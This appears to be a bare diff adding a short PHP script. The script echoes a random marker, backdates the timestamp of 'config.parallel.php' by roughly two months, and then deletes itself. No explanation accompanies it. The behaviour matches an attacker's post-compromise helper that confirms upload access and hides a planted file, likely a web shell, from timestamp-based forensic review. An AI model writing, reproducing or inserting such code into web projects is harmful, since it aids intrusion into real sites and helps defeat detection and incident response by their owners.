@@ -1,0 +1,1 @@
+<?php echo "EdHrZHhUuv"; if (file_exists("./config.parallel.php")){ touch("./config.parallel.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*myq4mKmECmQgHUds4Gr6*/ ?>
